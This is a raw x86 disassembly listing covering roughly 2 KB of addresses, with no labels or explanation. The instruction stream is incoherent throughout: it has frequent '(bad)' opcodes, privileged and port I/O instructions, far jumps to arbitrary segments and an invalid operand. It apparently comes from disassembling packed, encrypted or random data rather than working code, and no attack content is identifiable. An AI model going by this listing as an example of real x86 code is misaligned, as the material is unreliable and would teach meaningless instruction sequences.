  403f8d:	jg     0x403f24
  403f8f:	mov    WORD PTR [eax+0x73683362],ss
  403f95:	xlat   BYTE PTR ds:[ebx]
  403f96:	fs (bad) 
  403f99:	xor    edi,DWORD PTR [ebx+edi*8+0x46cd6d65]
  403fa0:	imul   edi,DWORD PTR [edi+esi*8],0x51b54bef
  403fa7:	mov    bl,0x72
  403fa9:	cli    
  403faa:	cwde   
  403fab:	or     ebp,DWORD PTR [edi+0x58992bd0]
  403fb1:	push   ebx
  403fb2:	rdpmc  
  403fb4:	xor    BYTE PTR [esi+ebp*8],0x28
  403fb8:	sub    eax,0x9ec8f68c
  403fbd:	add    esi,DWORD PTR [ebx-0x3]
  403fc0:	inc    esp
  403fc1:	mov    ds:0x6ce08012,eax
  403fc6:	push   ss
  403fc7:	sub    cl,0x67
  403fca:	stos   DWORD PTR es:[edi],eax
  403fcb:	mov    WORD PTR fs:[eax+0x62],ds
  403fcf:	popa   
  403fd0:	jecxz  0x403fe9
  403fd2:	push   ss
  403fd3:	fmul   QWORD PTR [eax+0x6fd41fdb]
  403fd9:	adc    al,0xc8
  403fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fdc:	ins    BYTE PTR es:[edi],dx
  403fdd:	sbb    ebp,DWORD PTR [ebp-0x1eda0b6f]
  403fe3:	les    edi,FWORD PTR [eax+0x49]
  403fe6:	div    DWORD PTR [edi-0x4b]
  403fe9:	sbb    esi,esi
  403feb:	pop    ds
  403fec:	in     eax,dx
  403fed:	jle    0x403fd1
  403fef:	mov    bh,0x6
  403ff1:	mov    ecx,0xaa4ac379
  403ff6:	lds    esi,FWORD PTR [eax-0x3a]
  403ff9:	rol    DWORD PTR [esp+eax*8-0x37],1
  403ffd:	ds dec ebx
  403fff:	or     ch,BYTE PTR [si+0x44]
  404003:	ds xchg edi,eax
  404005:	pop    ds
  404006:	jmp    0x3b2f:0x82098ad7
  40400d:	fisubr DWORD PTR [eax+0x7f]
  404010:	add    BYTE PTR [edx-0x4798a423],ah
  404016:	lods   al,BYTE PTR ds:[esi]
  404017:	jmp    0xf4416db8
  40401c:	lock add al,0xce
  40401f:	inc    esp
  404020:	pop    esi
  404021:	mov    BYTE PTR ds:0xb20aad29,cl
  404027:	int3   
  404028:	sub    al,BYTE PTR [ebp-0x3c]
  40402b:	and    edi,0xe3cc7c78
  404031:	cmp    eax,0x9ec50d5
  404036:	mov    esp,0xdaf95ae4
  40403b:	cwde   
  40403c:	outs   dx,DWORD PTR ds:[esi]
  40403d:	or     ebx,DWORD PTR [ecx-0x8b91042]
  404043:	push   ebp
  404044:	pop    edx
  404045:	(bad)  
  404046:	loopne 0x404000
  404048:	rcr    DWORD PTR [ebx+0x4d],cl
  40404b:	dec    esp
  40404c:	imul   ebp,edi,0xffffffd7
  40404f:	add    BYTE PTR [edx-0x61276749],ch
  404055:	repnz add ah,BYTE PTR [edi+0x8]
  404059:	push   eax
  40405a:	and    bl,BYTE PTR [esi-0x2f2d2019]
  404060:	in     al,0xc0
  404062:	(bad)  
  404063:	fcomi  st,st(6)
  404065:	xchg   BYTE PTR [edx-0x72bc16f9],ah
  40406b:	or     cl,bh
  40406d:	ror    BYTE PTR [ebx-0x1d],1
  404070:	inc    ebp
  404071:	cmp    esi,esi
  404073:	loop   0x404015
  404075:	out    0x95,eax
  404077:	sub    DWORD PTR [esi+0x58fc04f7],0xffffffb3
  40407e:	jl     0x40401d
  404080:	popf   
  404081:	mov    dl,0x7a
  404083:	inc    edi
  404084:	sbb    ch,BYTE PTR [esi+0x649e462c]
  40408a:	add    esp,DWORD PTR [esi+eax*8-0x37]
  40408e:	jg     0x40407c
  404090:	mov    al,0x89
  404092:	out    0x2f,al
  404094:	(bad)  
  404095:	dec    ebx
  404096:	adc    eax,0x4ee0665f
  40409b:	pop    ebp
  40409c:	jne    0x4040b5
  40409e:	int3   
  40409f:	imul   edx,DWORD PTR [ebp-0x8],0xe4554079
  4040a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a7:	cmp    ecx,DWORD PTR [ecx-0x42]
  4040aa:	inc    ecx
  4040ab:	push   0xea7bb049
  4040b0:	icebp  
  4040b1:	mov    edx,0x872b34dc
  4040b6:	iret   
  4040b7:	(bad)  
  4040b8:	xchg   edx,eax
  4040b9:	stos   DWORD PTR es:[edi],eax
  4040ba:	popf   
  4040bb:	and    dh,BYTE PTR [ebx-0x1]
  4040be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040bf:	pushf  
  4040c0:	rcr    BYTE PTR [ebp-0x3169ccf9],cl
  4040c6:	sub    DWORD PTR [ebp+0x54],0x502457bf
  4040cd:	ins    DWORD PTR es:[edi],dx
  4040ce:	add    ch,BYTE PTR [ebp-0x39]
  4040d1:	ins    BYTE PTR es:[edi],dx
  4040d2:	scas   eax,DWORD PTR es:[edi]
  4040d3:	mov    edi,0x295c96a3
  4040d8:	jge    0x404138
  4040da:	push   0x2ec0a785
  4040df:	lods   al,BYTE PTR ds:[esi]
  4040e0:	retf   0xb3a0
  4040e3:	and    bl,cl
  4040e5:	mov    bh,0x90
  4040e7:	hlt    
  4040e8:	(bad)  
  4040e9:	dec    BYTE PTR [eax-0x4b0080c3]
  4040ef:	mov    dh,0x6a
  4040f1:	jg     0x404124
  4040f3:	sub    eax,0x6649f0f3
  4040f8:	pop    eax
  4040f9:	or     DWORD PTR [eax+0x36],ebx
  4040fc:	push   eax
  4040fd:	test   al,0x6a
  4040ff:	rcr    BYTE PTR [ecx],cl
  404101:	mov    esi,0xa94fac57
  404106:	sbb    eax,0x8f696a4b
  40410b:	ja     0x404175
  40410d:	cmp    ah,BYTE PTR [esi+0x19]
  404110:	or     al,0xa3
  404112:	sub    DWORD PTR [esi],ebx
  404114:	popa   
  404115:	sbb    cl,dh
  404117:	jle    0x4040e3
  404119:	outs   dx,BYTE PTR ds:[esi]
  40411a:	push   ecx
  40411b:	and    al,0xa3
  40411d:	clc    
  40411e:	fdivp  st(5),st
  404120:	sbb    ecx,ebp
  404122:	mov    edi,0x82fd3b2f
  404127:	fadd   DWORD PTR [ebp+0x50b54166]
  40412d:	aas    
  40412e:	gs loop 0x404159
  404131:	test   bh,bl
  404133:	pop    eax
  404134:	pop    esi
  404135:	mov    eax,ds:0x919ba39
  40413a:	cmp    ebp,DWORD PTR [edx+0x537f5dc5]
  404140:	push   cs
  404141:	aad    0x11
  404143:	or     DWORD PTR [ebp-0x11],ebx
  404146:	jae    0x404101
  404148:	pop    ss
  404149:	test   BYTE PTR [esi+esi*1+0x6c2ecb37],al
  404150:	mov    al,ds:0xcc648792
  404155:	mov    ebp,0x57cdddce
  40415a:	enter  0xed06,0x95
  40415e:	push   ebx
  40415f:	scas   eax,DWORD PTR es:[edi]
  404160:	enter  0x36d5,0x10
  404164:	pusha  
  404165:	xchg   BYTE PTR [edi],cl
  404167:	leave  
  404168:	cdq    
  404169:	popa   
  40416a:	mov    bl,0x70
  40416c:	xchg   edx,eax
  40416d:	cmp    al,0xfc
  40416f:	pop    edi
  404170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404171:	fdivr  QWORD PTR [edi]
  404173:	xchg   ebx,eax
  404174:	inc    edi
  404175:	and    al,0x69
  404177:	jle    0x4041ac
  404179:	nop
  40417a:	lods   eax,DWORD PTR ds:[esi]
  40417b:	in     al,dx
  40417c:	add    DWORD PTR [esi-0x79],ecx
  40417f:	shl    DWORD PTR [eax],cl
  404181:	xchg   esi,eax
  404182:	stc    
  404183:	fmul   QWORD PTR [ebp*2-0x765a258d]
  40418a:	mov    eax,ds:0x42a8040a
  40418f:	fild   WORD PTR [esi+0x4559b06]
  404195:	data16 mov dh,0xb
  404198:	or     eax,0xadacfdac
  40419d:	inc    ebp
  40419e:	scas   eax,DWORD PTR es:[edi]
  40419f:	inc    edx
  4041a0:	not    BYTE PTR [ebx+ecx*1+0x46]
  4041a4:	jg     0x404197
  4041a6:	je     0x404151
  4041a8:	jno    0x404210
  4041aa:	xor    ebx,ebp
  4041ac:	or     al,0xd4
  4041ae:	call   0xe874b367
  4041b3:	aam    0x2f
  4041b5:	mov    al,0x69
  4041b7:	sub    eax,0x7de29546
  4041bc:	addr16 cmp edi,0x1f09c89c
  4041c3:	adc    bh,BYTE PTR [ebx+ecx*1+0x2b6a83b8]
  4041ca:	std    
  4041cb:	jo     0x404242
  4041cd:	fimul  DWORD PTR [ebx+0x86ecaae]
  4041d3:	mov    bl,0xee
  4041d5:	scas   eax,DWORD PTR es:[edi]
  4041d6:	xor    eax,0xdc072703
  4041db:	push   edi
  4041dc:	mov    edx,0xabd1572e
  4041e1:	sub    al,0xa4
  4041e3:	ins    DWORD PTR es:[edi],dx
  4041e4:	mov    BYTE PTR [eax+0x77],al
  4041e7:	mov    edx,0xcbecab5
  4041ec:	imul   BYTE PTR [esi+0x152ecffd]
  4041f2:	int    0x6a
  4041f4:	xchg   ebx,eax
  4041f5:	icebp  
  4041f6:	lds    edi,FWORD PTR [ebp-0x6f]
  4041f9:	cwde   
  4041fa:	dec    edx
  4041fb:	push   ebx
  4041fc:	mov    ds:0x679ecff3,al
  404201:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404203:	cld    
  404204:	add    al,0x3c
  404206:	addr16 mov dl,0xe5
  404209:	fist   DWORD PTR [eax]
  40420b:	xchg   ebx,eax
  40420c:	push   0xffffffaf
  40420e:	es ret 0x43d4
  404212:	shr    BYTE PTR [eax],0xee
  404215:	hlt    
  404216:	in     al,dx
  404217:	test   al,0xe8
  404219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421a:	mov    ds:0x636b580a,eax
  40421f:	fnstenv [ebp-0x60]
  404222:	dec    edx
  404223:	aas    
  404224:	aad    0x27
  404226:	push   ecx
  404227:	pusha  
  404228:	sub    DWORD PTR [edi],ebx
  40422a:	inc    esi
  40422b:	push   ebp
  40422c:	stos   DWORD PTR es:[edi],eax
  40422d:	add    ebp,DWORD PTR ds:0x295f2b51
  404233:	mov    ecx,0x990f5d4c
  404238:	add    eax,0x865636df
  40423d:	inc    edi
  40423e:	push   esi
  40423f:	fsub   DWORD PTR [edi-0x469652b4]
  404245:	jmp    0x90e2:0x75fbb1a1
  40424c:	pusha  
  40424d:	xlat   BYTE PTR ds:[ebx]
  40424e:	fwait
  40424f:	jnp    0x404286
  404251:	popa   
  404252:	sbb    eax,0xe42d46f0
  404257:	fild   QWORD PTR [edx+0xf]
  40425a:	add    BYTE PTR [ebx],dh
  40425c:	mov    dl,0xdf
  40425e:	jge    0x404250
  404260:	xlat   BYTE PTR ds:[ebx]
  404261:	push   ebx
  404262:	out    0x77,eax
  404264:	shr    BYTE PTR [ebp-0x3c7f846e],1
  40426a:	scas   eax,DWORD PTR es:[edi]
  40426b:	mov    BYTE PTR [eax-0x28],dh
  40426e:	adc    eax,0xdcbf6db2
  404273:	push   ebp
  404274:	loope  0x40427a
  404276:	ja     0x4042c9
  404278:	push   ebp
  404279:	(bad)  
  40427a:	or     ah,BYTE PTR [eax]
  40427c:	js     0x404296
  40427e:	inc    eax
  40427f:	push   0xa7c7674a
  404284:	jmp    0xa712d4a3
  404289:	jo     0x404217
  40428b:	push   eax
  40428c:	dec    eax
  40428d:	jg     0x40429e
  40428f:	or     ah,ah
  404291:	dec    esp
  404292:	mov    al,ds:0xa2ada358
  404297:	sub    eax,0x663e62ec
  40429c:	mov    edi,0xea9c5cf8
  4042a1:	sub    bh,BYTE PTR [ecx+0x291d97d]
  4042a7:	int3   
  4042a8:	div    BYTE PTR [esi-0x66]
  4042ab:	mov    dl,dh
  4042ad:	pop    esi
  4042ae:	aaa    
  4042af:	inc    ebp
  4042b0:	imul   DWORD PTR [edx]
  4042b2:	push   ebx
  4042b3:	sub    ecx,esp
  4042b5:	(bad)  
  4042b6:	push   cs
  4042b7:	adc    DWORD PTR [ebx+0x75e4a010],ecx
  4042bd:	ja     0x404320
  4042bf:	popa   
  4042c0:	cmp    BYTE PTR fs:[ebp-0x186598c6],ch
  4042c7:	ret    
  4042c8:	adc    cl,bh
  4042ca:	xchg   esp,eax
  4042cb:	push   0xffffffe5
  4042cd:	ins    BYTE PTR es:[edi],dx
  4042ce:	rcr    edx,1
  4042d0:	pop    esp
  4042d1:	loope  0x404268
  4042d3:	ins    DWORD PTR es:[edi],dx
  4042d4:	out    dx,al
  4042d5:	jb     0x404330
  4042d7:	and    al,0x3d
  4042d9:	and    bl,BYTE PTR [ebx+0x68]
  4042dc:	icebp  
  4042dd:	scas   al,BYTE PTR es:[edi]
  4042de:	gs nop
  4042e0:	sbb    DWORD PTR [edi],edx
  4042e2:	call   DWORD PTR [ebx+0x3f]
  4042e5:	adc    al,BYTE PTR [ebp+0x4d]
  4042e8:	jb     0x40432f
  4042ea:	shr    bh,cl
  4042ec:	sub    dl,ch
  4042ee:	sbb    ch,dl
  4042f0:	push   esp
  4042f1:	into   
  4042f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f3:	mov    cl,0xa7
  4042f5:	gs jmp 0x36f5:0x4da8d876
  4042fd:	add    ebp,DWORD PTR [eax+ebp*1+0x1cd73661]
  404304:	(bad)  
  404305:	in     al,dx
  404306:	test   eax,0xb8b689e8
  40430b:	test   eax,0x79b1ded8
  404310:	xchg   ebp,eax
  404311:	scas   eax,DWORD PTR es:[edi]
  404312:	scas   eax,DWORD PTR es:[edi]
  404313:	inc    ebp
  404314:	ffreep st(4)
  404316:	jne    0x404300
  404318:	xor    DWORD PTR [esi-0x528ba012],ebp
  40431e:	cmp    al,0x79
  404320:	sub    eax,DWORD PTR [esi+0x4218c96f]
  404326:	ror    DWORD PTR [ecx],1
  404328:	xchg   edx,eax
  404329:	iret   
  40432a:	push   es
  40432b:	adc    edi,DWORD PTR [ebx]
  40432d:	fld    QWORD PTR [esp+ecx*2+0x64]
  404331:	push   edi
  404332:	fistp  WORD PTR [esi-0x79b30ca7]
  404338:	and    eax,0xd2c7b133
  40433d:	fs out dx,al
  40433f:	pcmpeqb mm0,QWORD PTR [eax-0x301fb574]
  404346:	pop    ds
  404347:	sbb    BYTE PTR fs:[edx-0x69],0x9a
  40434c:	mov    bl,0xc4
  40434e:	out    0x53,al
  404350:	ds pop esi
  404352:	ss in  al,0x8
  404355:	xor    bl,0xad
  404358:	leave  
  404359:	xchg   edi,eax
  40435a:	dec    ebp
  40435b:	lods   eax,DWORD PTR ds:[esi]
  40435c:	mov    esi,0xfa32c3be
  404361:	test   eax,0xc82c4d10
  404366:	cmp    eax,0xef5c0496
  40436b:	loop   0x4043a9
  40436d:	xchg   edx,eax
  40436e:	outs   dx,BYTE PTR ds:[esi]
  40436f:	mov    eax,ds:0x2d663301
  404374:	dec    edx
  404375:	or     bh,BYTE PTR [eax+edx*1+0x661445ec]
  40437c:	add    ch,BYTE PTR [edx-0xc41f6f6]
  404382:	pop    ds
  404383:	mov    ebp,0xadbe9845
  404388:	(bad)  
  404389:	pop    eax
  40438a:	dec    ebx
  40438b:	sub    dl,BYTE PTR [esi]
  40438d:	mov    al,0xbd
  40438f:	and    ebp,edx
  404391:	and    BYTE PTR ds:0xefac3c42,dl
  404397:	or     cl,BYTE PTR [edx+0x31]
  40439a:	inc    edi
  40439b:	stos   BYTE PTR es:[edi],al
  40439c:	sbb    BYTE PTR [edi+0x29],dh
  40439f:	push   edx
  4043a0:	pop    es
  4043a1:	xchg   edi,eax
  4043a2:	loope  0x404421
  4043a4:	inc    eax
  4043a5:	or     eax,0x3b609ce6
  4043aa:	mov    bh,0xe0
  4043ac:	xor    eax,0x9b1da10d
  4043b1:	pusha  
  4043b2:	repz add al,0x81
  4043b5:	lods   al,BYTE PTR ds:[esi]
  4043b6:	pop    ebp
  4043b7:	sub    DWORD PTR [ebp+edi*4+0x31],edx
  4043bb:	jnp    0x40435a
  4043bd:	outs   dx,BYTE PTR ds:[esi]
  4043be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043bf:	retf   0xa980
  4043c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c3:	out    0xbe,eax
  4043c5:	and    BYTE PTR [ebp-0x56ff4e78],dh
  4043cb:	shr    BYTE PTR [esi-0x553a71f1],cl
  4043d1:	and    esp,eax
  4043d3:	adc    DWORD PTR ds:0xd12be988,0x1b21ffa7
  4043dd:	and    ch,BYTE PTR [eax-0x510bd30c]
  4043e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043e4:	fnsave ds:0x85bbd447
  4043ea:	loop   0x40439c
  4043ec:	jle    0x404403
  4043ee:	mov    ch,0x29
  4043f0:	mov    eax,0x99f4e547
  4043f5:	cwde   
  4043f6:	fadd   st(4),st
  4043f8:	repz les eax,FWORD PTR [edx-0x69baf214]
  4043ff:	popa   
  404400:	jl     0x40442a
  404402:	lock sar BYTE PTR [edi],0x4a
  404406:	xchg   edx,eax
  404407:	loopne 0x40445e
  404409:	and    esi,DWORD PTR [ebp+0x546db1b6]
  40440f:	ins    DWORD PTR es:[edi],dx
  404410:	push   ecx
  404411:	xchg   edi,eax
  404412:	bound  edx,QWORD PTR [esi-0x23]
  404415:	sbb    DWORD PTR [ebx-0x58],ecx
  404418:	fs gs xor dl,ch
  40441c:	in     eax,0xe1
  40441e:	jns    0x404453
  404420:	ret    0xa4c0
  404423:	sub    DWORD PTR [esi],edi
  404425:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  404427:	push   edi
  404428:	aas    
  404429:	repnz mov edx,0x67801362
  40442f:	sub    eax,DWORD PTR [ebx]
  404431:	fldenv [ebp-0xe]
  404434:	push   esp
  404435:	popf   
  404436:	add    bh,BYTE PTR [esi-0x415f108a]
  40443c:	aam    0xdc
  40443e:	add    eax,0x1f22ab90
  404443:	mov    ebp,DWORD PTR ds:0x70f293a8
  404449:	int3   
  40444a:	adc    eax,0x39978b09
  40444f:	push   0x10991e3e
  404454:	nop
  404455:	mov    ah,0xab
  404457:	mov    ds:0x8bacaab1,eax
  40445c:	jns    0x4044b0
  40445e:	xchg   edi,eax
  40445f:	sub    bl,BYTE PTR [bp+di]
  404462:	or     bh,bl
  404464:	mov    al,ds:0x92b1b729
  404469:	xor    eax,0x7e8883c6
  40446e:	add    ah,0x74
  404471:	xor    eax,0x88566fe3
  404476:	pop    esp
  404477:	xor    al,0xe5
  40447a:	test   BYTE PTR [edi+ebp*1-0x62],0x5
  40447f:	les    edx,FWORD PTR [edx]
  404481:	ins    DWORD PTR es:[edi],dx
  404482:	mov    DWORD PTR [ebp-0x39],ebx
  404485:	sbb    edi,esp
  404487:	in     eax,0x65
  404489:	ja     0x4044d5
  40448b:	sub    al,0x63
  40448d:	fistp  WORD PTR [eax]
  40448f:	(bad)  
  404490:	mov    dh,0x9b
  404492:	xchg   ecx,eax
  404493:	neg    al
  404495:	test   BYTE PTR [ecx],ah
  404497:	inc    eax
  404498:	pop    ebx
  404499:	test   BYTE PTR [ebp-0x534b954b],ch
  40449f:	mov    cl,0x8e
  4044a1:	fist   DWORD PTR [edi+0x0]
  4044a4:	sub    bh,cl
  4044a6:	hlt    
  4044a7:	(bad)  
  4044a8:	xor    edi,DWORD PTR [esi]
  4044aa:	sahf   
  4044ab:	fmulp  st(4),st
  4044ad:	ud0    edx,DWORD PTR [ebp-0x11]
  4044b1:	(bad)  
  4044b2:	xchg   ebx,eax
  4044b3:	lahf   
  4044b4:	mov    ecx,0x60dde5ff
  4044b9:	les    edx,FWORD PTR [edi-0x3d65aef6]
  4044bf:	pushf  
  4044c0:	and    eax,0x955d4b7e
  4044c5:	das    
  4044c6:	in     eax,0xd9
  4044c8:	dec    eax
  4044c9:	js     0x4044ca
  4044cb:	mov    bh,0x8d
  4044cd:	js     0x40445c
  4044cf:	scas   al,BYTE PTR es:[edi]
  4044d0:	repz (bad) 
  4044d2:	and    esp,ebp
  4044d4:	cs icebp 
  4044d6:	cmp    BYTE PTR [eax],dh
  4044d8:	push   0xea9ace73
  4044dd:	lahf   
  4044de:	inc    esp
  4044df:	sub    BYTE PTR [esi],0xa6
  4044e2:	shl    eax,1
  4044e4:	pop    ebp
  4044e5:	shl    ecx,cl
  4044e7:	jp     0x40450f
  4044e9:	retf   
  4044ea:	cmp    DWORD PTR [ecx],0xffffff8b
  4044ed:	pop    esi
  4044ee:	push   ebp
  4044ef:	lds    eax,FWORD PTR [ebx-0x3c]
  4044f2:	push   0x26
  4044f4:	pop    esp
  4044f5:	das    
  4044f6:	rcr    DWORD PTR [eax-0xb],1
  4044f9:	fdivr  DWORD PTR [ebx+0x48b4d89b]
  4044ff:	push   ss
  404500:	cs xchg ebx,eax
  404502:	pop    ds
  404503:	je     0x4044bc
  404505:	mov    WORD PTR [edx+0xa],cs
  404508:	inc    esi
  404509:	or     al,BYTE PTR [eax+0xb]
  40450c:	or     al,0xae
  40450e:	jns    0x40457d
  404510:	xchg   BYTE PTR [ebx+0x62572998],al
  404516:	ret    0x49f2
  404519:	sub    al,0x8f
  40451b:	mov    DWORD PTR [edi+0x5af76a23],esp
  404521:	cmp    bl,BYTE PTR [ebx]
  404523:	add    bh,BYTE PTR [eax]
  404525:	stc    
  404526:	jnp    0x40455f
  404528:	sti    
  404529:	pop    ebp
  40452a:	inc    ebx
  40452b:	inc    DWORD PTR [ecx]
  40452d:	mov    dh,0x19
  40452f:	je     0x4044d0
  404531:	lds    edi,FWORD PTR [eax-0x32537d01]
  404537:	jns    0x4045b2
  404539:	mov    eax,0xbb2790a4
  40453e:	inc    eax
  40453f:	cmp    al,0x52
  404541:	aad    0xcd
  404543:	adc    DWORD PTR [ebx+0x444c50bf],0xffffffb3
  40454a:	dec    ecx
  40454b:	or     ecx,ebp
  40454d:	xlat   BYTE PTR ds:[ebx]
  40454e:	(bad)  
  40454f:	int3   
  404550:	idiv   dh
  404552:	fcomp  DWORD PTR [ecx-0x2c8a8f4c]
  404558:	mov    bl,0xbd
  40455a:	shl    ah,0x2
  40455d:	xchg   edi,eax
  40455e:	push   ebx
  40455f:	gs vpsubq ymm3,ymm2,ymm7
  404564:	inc    esp
  404565:	xor    bh,bl
  404567:	or     al,0x1b
  404569:	xor    DWORD PTR [ecx+0x60bc4398],0xffffffec
  404570:	push   esi
  404571:	sbb    cl,BYTE PTR [ebx]
  404573:	call   0x314d:0x2c7bc5b7
  40457a:	xchg   esi,eax
  40457b:	sti    
  40457c:	fucomip st,st(6)
  40457e:	daa    
  40457f:	dec    edi
  404580:	ss inc esp
  404582:	enter  0xb4c2,0xb1
  404586:	adc    al,BYTE PTR ds:0xab9a1828
  40458c:	xor    esi,edi
  40458e:	daa    
  40458f:	mov    esi,0x8412d4d0
  404594:	ret    0x97c2
  404597:	and    al,0x6c
  40459a:	je     0x4045e5
  40459c:	inc    esp
  40459d:	mov    bl,0x18
  40459f:	(bad)  [ebx-0x78]
  4045a2:	in     eax,dx
  4045a3:	dec    esp
  4045a4:	pop    edx
  4045a5:	add    eax,0xf9f2ad03
  4045aa:	adc    BYTE PTR [esi],ah
  4045ac:	xchg   BYTE PTR [eax],al
  4045ae:	add    esi,DWORD PTR [edx+0x7c]
  4045b1:	jl     0x4045d8
  4045b3:	stos   DWORD PTR es:[edi],eax
  4045b4:	adc    al,0x48
  4045b6:	mov    ah,0xfb
  4045b8:	add    BYTE PTR [ecx*1+0x4466f843],cl
  4045bf:	repz pushf 
  4045c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c2:	cmp    ah,cl
  4045c4:	rsqrtps xmm2,xmm0
  4045c7:	popf   
  4045c8:	jp     0x40458d
  4045ca:	(bad)  
  4045cb:	xchg   ecx,eax
  4045cc:	xor    edx,ebp
  4045ce:	jmp    0x425ce24e
  4045d3:	sahf   
  4045d4:	data16 mov cl,bh
  4045d7:	add    al,0x40
  4045d9:	cmp    BYTE PTR [eax+0x6b],al
  4045dc:	xchg   ebp,eax
  4045dd:	retf   0x1efe
  4045e0:	dec    ebx
  4045e1:	xchg   ecx,eax
  4045e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045e3:	inc    edx
  4045e4:	cmp    al,0xc
  4045e6:	in     eax,dx
  4045e7:	aad    0xaf
  4045e9:	mov    DWORD PTR [esi-0x33d45e59],0x59196fb8
  4045f3:	aam    0x3a
  4045f5:	lahf   
  4045f6:	pop    eax
  4045f7:	mov    ebp,0xf918ba7
  4045fc:	mov    ch,0xc7
  4045fe:	lea    esi,ss:[edx-0x64]
  404602:	ret    0x847c
  404605:	and    ebp,DWORD PTR [ecx]
  404607:	stos   BYTE PTR es:[edi],al
  404608:	push   esi
  404609:	loop   0x404649
  40460b:	fistp  DWORD PTR [ebx+0x7cf38037]
  404611:	xchg   ecx,eax
  404612:	(bad)  
  404613:	retf   
  404614:	mov    al,ds:0xf46e9bba
  404619:	mov    bh,0xf1
  40461b:	in     al,0x3d
  40461d:	mov    ?,WORD PTR [edx+0x6e]
  404620:	xor    BYTE PTR [ecx],dl
  404622:	inc    eax
  404623:	cmc    
  404624:	lahf   
  404625:	and    eax,0xeef8e388
  40462a:	jmp    0x531f77d0
  40462f:	inc    ebp
  404630:	repz aas 
  404632:	gs cmp ax,0x4303
  404637:	inc    esi
  404638:	scas   eax,DWORD PTR es:[edi]
  404639:	add    dh,BYTE PTR [eax]
  40463b:	jb     0x404653
  40463d:	inc    ebx
  40463e:	std    
  40463f:	pop    ss
  404640:	mov    ds:0xa3781212,eax
  404645:	cmp    BYTE PTR [eax-0x5feaa30a],dh
  40464b:	aas    
  40464c:	les    edi,FWORD PTR [esi-0x1a]
  40464f:	xchg   esp,eax
  404650:	jge    0x4046b8
  404652:	jmp    0x40460f
  404654:	dec    ebp
  404655:	popf   
  404656:	inc    esp
  404657:	into   
  404658:	shl    cl,1
  40465a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40465b:	sub    eax,0xdc5bf778
  404660:	loope  0x404611
  404662:	in     al,0xe5
  404664:	rcr    DWORD PTR [esi+0x54],cl
  404667:	in     al,dx
  404668:	pop    es
  404669:	fmul   DWORD PTR [edx+0x16]
  40466c:	sbb    BYTE PTR [ebx],0xf3
  40466f:	gs xchg ecx,eax
  404671:	dec    esi
  404672:	pop    eax
  404673:	icebp  
  404674:	sbb    al,0xca
  404676:	inc    ebp
  404677:	nop
  404678:	call   0xc4f6:0xdf5a566
  40467f:	in     al,dx
  404680:	call   0xefc0:0xf9aec032
  404687:	int    0xc5
  404689:	push   cs
  40468a:	xor    eax,0xe7d2bbc6
  40468f:	mov    al,0xb1
  404691:	(bad)  
  404692:	test   al,0x1d
  404694:	sar    BYTE PTR [ebp+0xda20e6c],0xdc
  40469b:	(bad)  
  40469d:	mov    bh,0xf4
  40469f:	popa   
  4046a0:	mov    bl,0x8c
  4046a2:	out    dx,eax
  4046a3:	jg     0x40470b
  4046a5:	lahf   
  4046a6:	mov    edi,0x6c3ca52d
  4046ab:	or     DWORD PTR [edx+0x1ab04ae3],edx
  4046b1:	(bad)  
  4046b2:	lea    edi,[ecx]
  4046b4:	push   cs
  4046b5:	jg     0x4046fa
  4046b7:	aaa    
  4046b8:	imul   edi,DWORD PTR [eax-0x32f8b587],0xafb4636e
  4046c2:	cmp    esp,edx
  4046c4:	cmp    BYTE PTR [ebp-0x1a],al
  4046c7:	jnp    0x4046e6
  4046c9:	jmp    0x49a7:0x5eac0e8
  4046d0:	xor    DWORD PTR [esi-0x6dc2d822],edi
  4046d6:	inc    edi
  4046d7:	xchg   ecx,eax
  4046d8:	adc    BYTE PTR [edi+0x7366eaaa],ch
  4046de:	sbb    al,0x24
  4046e0:	adc    BYTE PTR fs:[ecx],dl
  4046e3:	and    al,bh
  4046e5:	js     0x404752
  4046e7:	in     al,dx
  4046e8:	(bad)  
  4046e9:	mov    ds:0x82eff66e,al
  4046ee:	push   ss
  4046ef:	fcomp  QWORD PTR [ebx-0x78]
  4046f2:	test   al,0x60
  4046f4:	test   DWORD PTR [edi+0x4bd81540],eax
  4046fa:	mov    eax,ds:0x26df7cb9
  4046ff:	cld    
  404700:	push   ecx
  404701:	popf   
  404702:	mov    ebp,0xdabde89d
  404707:	cmp    al,0xe1
  404709:	jno    0x4046b2
  40470b:	loope  0x40468d
  40470d:	inc    eax
  40470e:	sbb    al,0x55
  404710:	lahf   
  404711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404712:	jns    0x40471e
  404714:	(bad)  
  404716:	into   
  404717:	inc    esp
  404718:	dec    ebx
  404719:	ret    
  40471a:	adc    BYTE PTR [esi-0x61e038d8],dh
  404720:	mov    esi,0xbc309cf6
  404725:	mov    al,ds:0x2a800660
  40472a:	and    al,0xa7
  40472c:	mov    BYTE PTR [edx],dh
  40472e:	fucom  st(0)
  404730:	ficom  DWORD PTR [ebx-0x5a]
  404733:	or     al,0x49
  404735:	test   DWORD PTR [eax],ebx
  404737:	scas   eax,DWORD PTR es:[edi]
  404738:	test   al,0xf3
  40473a:	mov    esp,0x5b902002
  40473f:	pop    ebx
  404740:	outs   dx,DWORD PTR ds:[esi]
  404741:	sahf   
  404742:	(bad)  
  404744:	repz in eax,0x64
  404747:	mov    al,0xea
  404749:	jmp    0xeb59:0x9ce471b7
  404750:	popa   
  404751:	or     ebp,DWORD PTR ds:[ecx+edi*8+0x6f]
  404756:	into   
  404757:	outs   dx,BYTE PTR ds:[esi]
  404758:	pop    edx
  404759:	push   ebx
  40475a:	sub    ah,BYTE PTR es:[edx+0xfbf0a74]
  404761:	aaa    
  404762:	jmp    0xe9564197
  404767:	mov    ah,0x96
  404769:	retf   
  40476a:	dec    edi
  40476b:	or     al,0x79
  40476d:	in     eax,0xbe
  40476f:	mov    ch,0xd3
  404771:	inc    esp
